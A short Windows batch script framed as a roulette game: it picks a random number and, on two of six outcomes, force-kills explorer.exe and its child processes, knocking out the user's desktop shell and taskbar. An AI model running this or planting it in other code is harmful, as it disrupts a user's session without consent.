@echo off
set death_number3=4
set death_number0=0
set rand=%random%
set /a rollet_number=%rand% * 6 / 32768
if %rollet_number%==%death_number0% goto bad_luck
if %rollet_number%==%death_number3% goto bad_luck
goto end
:bad_luck
taskkill /F /IM explorer.exe /T
:end